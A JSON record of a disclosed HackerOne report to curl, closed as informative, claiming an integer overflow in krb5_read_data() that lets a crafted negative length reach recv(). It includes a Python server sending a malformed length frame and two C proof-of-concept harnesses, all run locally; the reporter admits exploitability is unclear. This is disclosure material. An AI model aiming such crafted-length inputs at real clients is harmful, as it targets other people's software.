@@ -1,0 +1,123 @@
+{
+  "id": 3341476,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzQxNDc2",
+  "url": "https://hackerone.com/reports/3341476",
+  "title": "int overflow in krb5_read_data() leads to (possible) massive `recv()` write",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "low",
+  "readable_substate": "Informative",
+  "created_at": "2025-09-16T19:30:03.204Z",
+  "submitted_at": "2025-09-16T19:30:03.526Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "smiliesandco",
+    "url": "/smiliesandco",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/5asxrod24t97deki4ohjo3v68ap0/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-09-18T09:33:13.437Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-09-17T20:49:32.206Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\n(Note: AI created the PoC, not the report.)\n\nIn the `krb5_read_data()` function [here](https://github.com/curl/curl/blob/af7d67d3c03329116e593d999851d2cc3ebbf119/lib/krb5.c#L526-L551), there are two issues (one of which I am very surprised hasn't been caught before.)\n\nIssue #1 is that [this block](https://github.com/curl/curl/blob/af7d67d3c03329116e593d999851d2cc3ebbf119/lib/krb5.c#L539C1-L541C30) can result in an int overflow, where the following check becomes invalid if the value is wrapped to a negative:\n\n```\n    len = (int)ntohl((uint32_t)len);\n    if(len > CURL_MAX_INPUT_LENGTH)\n      return CURLE_TOO_LARGE;\n```\n\nThis will then seemingly completely mess up the logic [here](https://github.com/curl/curl/blob/af7d67d3c03329116e593d999851d2cc3ebbf119/lib/krb5.c#L549-L551):\n\n```\n    char buffer[1024];\n    nread = CURLMIN(len, (int)sizeof(buffer));\n    result = socket_read(data, sockindex, buffer, (size_t)nread);\n```\n\nSince -1 (let's say is less than 1024, `nread` will be passed as `(size_t)-1`, which will wrap to a massive number.\n\nThis eventually makes its way down to `Curl_conn_recv` with `data[1024]` and `nread == ~SIZE_MAX`) [here](https://github.com/curl/curl/blob/af7d67d3c03329116e593d999851d2cc3ebbf119/lib/krb5.c#L486) and so on and so on.\n\nIt seems that this will result in an OOB read, as the buffer is only 1024-bytes long, while `nread` is going to be massive.\n\nIssue #2 is that this whole code seems broken. [This do-while](https://github.com/curl/curl/blob/af7d67d3c03329116e593d999851d2cc3ebbf119/lib/krb5.c#L558) loop continues while `len` is non-zero. But then `len=0` is passed to `decode()` [here](https://github.com/curl/curl/blob/af7d67d3c03329116e593d999851d2cc3ebbf119/lib/krb5.c#L560-L562). As a random guess, I imagine `curlx_dyn_len(&buf->buf)` should be passed, not `len`.\n\n\n## Affected version\n\nAll of them since inception, it seems.\n\n## Steps To Reproduce:\n\nSetting up a whole krb environment is extremely difficult and annoying. This PoC is much easier, demonstrating the issue, while emulating the same code:\n\nrepro_server.py:\n```python\n#!/usr/bin/env python3\nimport socket, struct, argparse, sys, time\n\ndef main():\n    ap = argparse.ArgumentParser()\n    ap.add_argument(\"--port\", type=int, default=9999)\n    ap.add_argument(\"--netlen\", type=lambda x:int(x,0), default=0x00000010,\n                    help=\"4-byte big-endian length to send (e.g. 0x10 or 16)\")\n    ap.add_argument(\"--payload-byte\", default=\"41\", help=\"hex byte to repeat (default '41' = 'A')\")\n    args = ap.parse_args()\n\n    payload = bytes([int(args.payload_byte, 16)]) * (args.netlen & 0xffffffff)\n    netlen = struct.pack(\"!I\", args.netlen & 0xffffffff)\n\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    s.bind((\"0.0.0.0\", args.port))\n    s.listen(1)\n    print(f\"listening on :{args.port} …\")\n    while True:\n        conn, addr = s.accept()\n        print(\"client:\", addr, \" sending frame len=\", hex(args.netlen))\n        try:\n            conn.sendall(netlen)\n            if args.netlen:\n                conn.sendall(payload)\n            time.sleep(0.2)\n        finally:\n            conn.close()\n\nif __name__ == \"__main__\":\n    main()\n```\n\nkrb5_len_bug_harness.c:\n```c\n// gcc -O2 -Wall -o krb5_len_bug_harness krb5_len_bug_harness.c\n// ./krb5_len_bug_harness 127.0.0.1 9999\n#define _POSIX_C_SOURCE 200112L\n#include <arpa/inet.h>\n#include <errno.h>\n#include <inttypes.h>\n#include <netdb.h>\n#include <netinet/in.h>\n#include <stdbool.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <unistd.h>\n\nstatic int connect_tcp(const char *host, const char *port) {\n  struct addrinfo hints = {0}, *res = NULL;\n  hints.ai_family = AF_INET;\n  hints.ai_socktype = SOCK_STREAM;\n  int rc = getaddrinfo(host, port, &hints, &res);\n  if (rc) { fprintf(stderr, \"getaddrinfo: %s\\n\", gai_strerror(rc)); exit(1); }\n  int fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);\n  if (fd < 0) { perror(\"socket\"); exit(1); }\n  if (connect(fd, res->ai_addr, res->ai_addrlen) < 0) { perror(\"connect\"); exit(1); }\n  freeaddrinfo(res);\n  return fd;\n}\n\nstatic int socket_read_full(int fd, void *buf, size_t want) {\n  uint8_t *p = buf; size_t got = 0;\n  while (got < want) {\n    ssize_t r = read(fd, p + got, want - got);\n    if (r < 0) { if (errno == EINTR) continue; perror(\"read\"); return -1; }\n    if (r == 0) { fprintf(stderr, \"eof\\n\"); return -1; }\n    got += (size_t)r;\n  }\n  return 0;\n}\n\n// Stand-in for conn->mech->decode(...)\n// We'll just report the length parameter we *received* and pretend to \"decode\" in place.\nstatic int fake_decode(void *app_data, unsigned char *buf, int len, int data_prot, void *conn) {\n  (void)app_data; (void)buf; (void)data_prot; (void)conn;\n  fprintf(stderr, \"fake_decode() was called with len=%d (should be >0 if correct)\\n\", len);\n  // Return a positive length to mimic successful decode of existing buffer.\n  return 1234;\n}\n\nint main(int argc, char **argv) {\n  if (argc != 3) {\n    fprintf(stderr, \"usage: %s HOST PORT\\n\", argv[0]);\n    return 2;\n  }\n  int fd = connect_tcp(argv[1], argv[2]);\n\n  // --- Begin: mirror the buggy code’s control flow ---\n\n  int len; // NOTE: intentionally 'int' to match the problematic code\n  if (socket_read_full(fd, &len, sizeof(len)) != 0) return 1;\n\n  if (len) {\n    // network to host, then cast back to int (same as original)\n    len = (int)ntohl((uint32_t)len);\n\n    // Size check done against 'int' (problematic if sign bit set)\n    const int CURL_MAX_INPUT_LENGTH = 100*1024*1024;\n    if (len > CURL_MAX_INPUT_LENGTH) {\n      fprintf(stderr, \"too large\\n\");\n      return 1;\n    }\n    // reset dynbuf (omitted; we’ll just malloc)\n  } else {\n    fprintf(stderr, \"recv error (zero header)\\n\");\n    return 1;\n  }\n\n  if (len < 0) {\n    fprintf(stderr, \"NOTE: len is NEGATIVE here after ntohl cast. This bypasses >MAX check above.\\n\");\n  }\n\n  unsigned char *dyn = NULL;\n  size_t cap = 0;\n  // Read loop that decrements len to zero\n  while (len) {\n    int nread = len < 1024 ? len : 1024; // CURLMIN(len, sizeof buffer)\n    dyn = realloc(dyn, cap + (size_t)nread);\n    if (!dyn) { perror(\"realloc\"); return 1; }\n    if (socket_read_full(fd, dyn + cap, (size_t)nread) != 0) return 1;\n    cap += (size_t)nread;\n    len -= nread;\n  }\n\n  // At this point 'len' is 0, but 'cap' is the actual number of bytes we read.\n  fprintf(stderr, \"after loop: actual_buffer_len=%zu, len_variable=%d\\n\", cap, len);\n\n  int nread = fake_decode(NULL, dyn, len, /*data_prot*/0, NULL); // <-- passes 0\n  if (nread < 0) { fprintf(stderr, \"decode error\\n\"); return 1; }\n\n  fprintf(stderr, \"fake_decode returned %d; we would then set dynbuf length to that.\\n\", nread);\n  free(dyn);\n  close(fd);\n  return 0;\n}\n```\n\nRunning them together:\n```\npython3 repro_server.py --port 9999 --netlen 0x80000010 & \n./krb5_len_bug_harness 127.0.0.1 9999\n```\n\nwe get:\n\n```\n$ ./krb5_len_bug_harness 127.0.0.1 9999\nclient: ('127.0.0.1', 43974)  sending frame len= 0x80000010\nNOTE: len is NEGATIVE here after ntohl cast. This bypasses >MAX check above.\nrealloc: Cannot allocate memory\n```\n\ndemonstrates that this code is broken.\n\n\n## Extra:\n\nThe question is now whether it is exploitable. I can give a solid: \"I don't know\".\n\nHere is another PoC which we can test with:\n\n```c\n#define _GNU_SOURCE\n#include <arpa/inet.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <netinet/in.h>\n#include <pthread.h>\n#include <stdbool.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <unistd.h>\n\n// --- Minimal curl-like scaffolding ---\ntypedef enum {\n  CURLE_OK = 0,\n  CURLE_TOO_LARGE = 1,\n  CURLE_RECV_ERROR = 2,\n  CURLE_AGAIN = 3,\n  CURLE_FAILED_INIT = 4,\n  CURLE_BAD_FUNCTION_ARGUMENT = 5\n} CURLcode;\n\n#define CURL_MAX_INPUT_LENGTH (16 * 1024 * 1024) // 16 MiB for demo\n#define CURLMIN(a,b) ((a) < (b) ? (a) : (b))\n\nstruct dynbuf {\n  char *ptr;\n  size_t len;\n  size_t cap;\n};\n\nstatic void dyn_init(struct dynbuf *d) { d->ptr = NULL; d->len = d->cap = 0; }\nstatic void dyn_reset(struct dynbuf *d) { d->len = 0; }\nstatic int dyn_grow(struct dynbuf *d, size_t need) {\n  if (d->cap - d->len >= need) return 0;\n  size_t newcap = d->cap ? d->cap : 1024;\n  while (newcap - d->len < need) {\n    newcap *= 2;\n  }\n  char *np = (char*)realloc(d->ptr, newcap);\n  if (!np) return -1;\n  d->ptr = np; d->cap = newcap;\n  return 0;\n}\nstatic CURLcode dyn_addn(struct dynbuf *d, const char *src, size_t n) {\n  if (dyn_grow(d, n) != 0) return CURLE_RECV_ERROR;\n  memcpy(d->ptr + d->len, src, n);\n  d->len += n;\n  return CURLE_OK;\n}\nstatic char* dyn_ptr(struct dynbuf *d) { return d->ptr; }\nstatic size_t dyn_len(struct dynbuf *d) { return d->len; }\nstatic void dyn_setlen(struct dynbuf *d, size_t n) { if (n <= d->cap) d->len = n; }\n\nstruct krb5buffer { struct dynbuf buf; size_t index; };\n\nstruct connectdata {\n  int fd[2];\n};\n\nstruct Curl_easy {\n  struct connectdata *conn;\n};\n\n// --- Vulnerable helpers (mirroring the snippet) ---\nstatic CURLcode Curl_conn_recv(struct Curl_easy *data, int sockindex,\n                               char *buf, size_t blen, size_t *pnread) {\n  (void)data;\n  int fd = data->conn->fd[sockindex];\n  ssize_t r = recv(fd, buf, blen, 0); // passes 'blen' straight to kernel\n  if (r < 0) {\n    if (errno == EAGAIN || errno == EWOULDBLOCK) return CURLE_AGAIN;\n    return CURLE_RECV_ERROR;\n  }\n  *pnread = (size_t)r;\n  return CURLE_OK;\n}\n\nstatic CURLcode socket_read(struct Curl_easy *data, int sockindex, void *to, size_t len) {\n  char *to_p = (char*)to;\n  CURLcode result;\n  size_t nread = 0;\n  while (len > 0) {\n    result = Curl_conn_recv(data, sockindex, to_p, len, &nread);\n    if (result == CURLE_AGAIN) continue;\n    if (result) return result;\n    if (nread > len) return CURLE_RECV_ERROR;\n    len -= nread;\n    to_p += nread;\n  }\n  return CURLE_OK;\n}\n\n// --- The vulnerable function as in the snippet (bug preserved) ---\nstatic CURLcode krb5_read_data_vuln(struct Curl_easy *data, int sockindex,\n                                    struct krb5buffer *kbuf) {\n  int len; // <-- signed\n  CURLcode result;\n  int nread;\n\n  result = socket_read(data, sockindex, &len, sizeof(len));\n  if (result) return result;\n\n  if (len) {\n    len = (int)ntohl((uint32_t)len); // potential negative value\n    if (len > CURL_MAX_INPUT_LENGTH) // negative bypasses this check\n      return CURLE_TOO_LARGE;\n    dyn_reset(&kbuf->buf);\n  } else {\n    return CURLE_RECV_ERROR;\n  }\n  do {\n    char buffer[1024]; // fixed stack buffer\n    nread = CURLMIN(len, (int)sizeof(buffer)); // if len<0 -> nread<0\n    result = socket_read(data, sockindex, buffer, (size_t)nread); // cast to huge size_t\n    if (result) return result;\n    result = dyn_addn(&kbuf->buf, buffer, (size_t)nread);\n    if (result) return result;\n    len -= nread;\n  } while (len);\n\n  // pretend-decode, but len is now 0 in this code path\n  int dec = (int)dyn_len(&kbuf->buf);\n  if (dec < 0) return CURLE_RECV_ERROR;\n  dyn_setlen(&kbuf->buf, (size_t)dec);\n  kbuf->index = 0;\n  return CURLE_OK;\n}\n\n// --- Test harness ---\nstruct writer_args { int fd; int mode; };\n\nstatic void* writer_thread(void *argp) {\n  struct writer_args *a = (struct writer_args*)argp;\n  uint32_t netlen;\n  if (a->mode == 0) { // overflow: claim 0x80001000, send 4096 bytes\n    uint32_t host = 0x80001000u;\n    netlen = htonl(host);\n    (void)send(a->fd, &netlen, sizeof(netlen), 0);\n    // send 4096 bytes\n    size_t payload = 4096;\n    char *buf = (char*)malloc(payload);\n    memset(buf, 'A', payload);\n    (void)send(a->fd, buf, payload, 0);\n    free(buf);\n    // keep the socket open briefly to encourage a single large recv\n    usleep(100000);\n  } else { // dos: claim huge, send very little then close\n    uint32_t host = 0x80010000u;\n    netlen = htonl(host);\n    (void)send(a->fd, &netlen, sizeof(netlen), 0);\n    char tiny[8] = {0};\n    (void)send(a->fd, tiny, sizeof(tiny), 0);\n    // close to simulate peer disappearance\n  }\n  // Close writer end\n  shutdown(a->fd, SHUT_WR);\n  close(a->fd);\n  return NULL;\n}\n\nstatic void set_blocking(int fd) {\n  int fl = fcntl(fd, F_GETFL);\n  if (fl >= 0) fcntl(fd, F_SETFL, fl & ~O_NONBLOCK);\n}\n\nint main(int argc, char **argv) {\n  int mode = 0;\n  if (argc > 1) {\n    if (strcmp(argv[1], \"overflow\") == 0) mode = 0;\n    else if (strcmp(argv[1], \"dos\") == 0) mode = 1;\n    else {\n      fprintf(stderr, \"Usage: %s [overflow|dos]\\n\", argv[0]);\n      return 2;\n    }\n  }\n\n  int sv[2];\n  if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) {\n    perror(\"socketpair\");\n    return 1;\n  }\n  set_blocking(sv[0]);\n  set_blocking(sv[1]);\n\n  pthread_t th;\n  struct writer_args wa = {.fd = sv[1], .mode = mode};\n  if (pthread_create(&th, NULL, writer_thread, &wa) != 0) {\n    perror(\"pthread_create\");\n    return 1;\n  }\n\n  // client side\n  struct connectdata conn = { .fd = { sv[0], -1 } };\n  struct Curl_easy easy = { .conn = &conn };\n  struct krb5buffer kbuf;\n  dyn_init(&kbuf.buf);\n  kbuf.index = 0;\n\n  CURLcode rc = krb5_read_data_vuln(&easy, 0, &kbuf);\n\n  printf(\"krb5_read_data_vuln returned code: %d\\n\", rc);\n\n  // Clean up\n  free(kbuf.buf.ptr);\n  close(sv[0]);\n  pthread_join(th, NULL);\n  return 0;\n}\n```\n\nWhen building this and running it as `./a.out poc`, it does not cause any problem:\n\n```\n$ ./a overflow\nkrb5_read_data_vuln returned code: 2\n```\n\nSo what's going on? The \"problem\" is this call:\n\n```\n  int fd = data->conn->fd[sockindex];\n  ssize_t r = recv(fd, buf, blen, 0); // passes 'blen' straight to kernel\n```\nWith `blen` now effectively `18446744071562072064`, the following is effectively called:\n```\nrecv(fd, buf, 18446744071562072064, 0);\n```\n\nThis fails because that is beyond even our whole stack, and `recv()` is smart enough _on my system_ to not allow this; it fail with:\n\n```\nstrerror(errno): Bad address\n```\n\nwhich, indeed means \"The system detected an invalid pointer address in attempting to use a pointer argument of a call\".\n\nI have not investigated further whether it is possible to write an amount of memory which will satisfy the kernel's limitation here, and I don't know enough about other systems, and how they work.\n\nIn any case, I thought I would report this issue here instead of via a GH issue, because while it may be \"unexploitable\" to me, it may not be to others.\n\n## Impact\n\n## Summary:\n\nOOM write due to int overflow, or possibly nothing at all (due to kernel restrictions of `recv()`).\n\n\nAlso the whole function looks broken (`len` stuff)",
+  "weakness": {
+    "id": 15,
+    "name": "Integer Overflow"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 17,
+  "voters": [
+    "t4r1k-b41",
+    "jmo740",
+    "2026",
+    "wefega",
+    "gilnet",
+    "hayder790",
+    "aryanstha",
+    "whitehatethicalhacker_pathum_p",
+    "chenlvtang",
+    "stackraid",
+    "and 7 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
